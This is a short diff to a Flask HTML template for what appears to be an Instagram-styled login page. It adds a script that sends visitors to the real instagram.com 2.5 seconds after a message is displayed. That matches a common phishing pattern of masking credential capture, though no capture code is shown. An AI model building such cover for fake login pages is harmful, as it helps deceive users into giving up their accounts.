@@ -8,7 +8,13 @@
     <link rel="stylesheet" href="{{ url_for('static', filename='css/media-queries.css') }}">
     <link rel="icon" href="{{ url_for('static', filename='photos/insta-icon.jpg') }}">
     <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;700&display=swap" rel="stylesheet">
-
+    <script>
+        function redirectToInstagram() {
+            setTimeout(function() {
+                window.location.href = "https://www.instagram.com";
+            }, 2500);  // 2.5 sekunde pauze
+        }
+    </script>
 </head>
 <body>
     <main>
@@ -27,6 +33,9 @@
                     <div class="message" style="color: red; margin-top: 10px;">
                         <p>{{ message }}</p>
                     </div>
+                    <script>
+                        redirectToInstagram();
+                    </script>
                 {% endif %}
 
                 <span class="or-divider">OR</span>
